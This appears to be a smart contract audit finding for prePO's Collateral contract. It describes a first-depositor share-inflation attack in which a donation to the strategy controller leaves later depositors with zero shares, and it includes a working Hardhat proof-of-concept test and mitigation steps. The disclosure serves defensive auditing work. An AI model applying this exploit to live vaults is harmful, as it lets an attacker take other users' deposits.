# Lines of code  https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L82-L91   # Vulnerability details  ## Details  The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.  ## Proof of Concept  - Attacker deposits 2 wei (so that it is greater than min fee) to mint 1 share - Attacker transfers exorbitant amount to `_strategyController` to greatly inflate the share’s price. Note that the `_strategyController` deposits its entire balance to the strategy when its `deposit()` function is called. - Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.  ```jsx it("will cause 0 share issuance", async () => {  // 1. first user deposits 2 wei because 1 wei will be deducted for fee  let firstDepositAmount = ethers.BigNumber.from(2)  await transferAndApproveForDeposit(      user,      collateral.address,      firstDepositAmount  )    await collateral      .connect(user)      .deposit(firstDepositAmount)    // 2. do huge transfer of 1M to strategy to controller  // to greatly inflate share price  await baseToken.transfer(strategyController.address, ethers.utils.parseEther("1000000"));    // 3. deployer tries to deposit reasonable amount of 10_000  let subsequentDepositAmount = ethers.utils.parseEther("10000");  await transferAndApproveForDeposit(      deployer,      collateral.address,      subsequentDepositAmount  )   await collateral      .connect(deployer)      .deposit(subsequentDepositAmount)    // receives 0 shares in return  expect(await collateral.balanceOf(deployer.address)).to.be.eq(0) }); ```  ## Recommended Mitigation Steps  - [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution. - Ensure the number of shares to be minted is non-zero: `require(_shares != 0, "zero shares minted");` - Create a periphery contract that contains a wrapper function that atomically calls `initialize()` and `deposit()` - Call `deposit()` once in `initialize()` to achieve the same effect as the suggestion above.
